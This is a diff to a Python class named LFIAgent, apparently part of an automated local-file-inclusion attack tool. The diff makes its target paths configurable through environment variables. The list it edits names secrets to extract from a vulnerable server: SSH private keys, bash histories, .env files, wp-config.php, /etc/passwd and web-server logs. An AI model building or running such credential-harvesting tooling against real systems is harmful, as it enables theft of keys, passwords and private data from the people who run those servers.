@@ -50,6 +50,10 @@ class LFIAgent(BaseAgent):
         
     def _load_sensitive_files(self) -> Dict[str, List[str]]:
         """โหลดรายการไฟล์สำคัญที่ต้องการดึง"""
+        # Get target paths from environment (for flexibility)
+        target_home = os.getenv('TARGET_HOME_DIR', '/home')
+        target_web_root = os.getenv('TARGET_WEB_ROOT', '/var/www/html')
+        
         return {
             'linux': [
                 '/etc/passwd',
@@ -63,12 +67,12 @@ class LFIAgent(BaseAgent):
                 '/etc/nginx/nginx.conf',
                 '/etc/php/7.0/apache2/php.ini',
                 '/etc/php/7.4/apache2/php.ini',
-                '/var/www/html/.env',
-                '/var/www/html/config.php',
-                '/var/www/html/wp-config.php',
-                '/home/*/.ssh/id_rsa',
-                '/home/*/.ssh/id_dsa',
-                '/home/*/.bash_history',
+                f'{target_web_root}/.env',
+                f'{target_web_root}/config.php',
+                f'{target_web_root}/wp-config.php',
+                f'{target_home}/*/.ssh/id_rsa',
+                f'{target_home}/*/.ssh/id_dsa',
+                f'{target_home}/*/.bash_history',
                 '/root/.ssh/id_rsa',
                 '/root/.bash_history',
                 '/var/log/apache2/access.log',
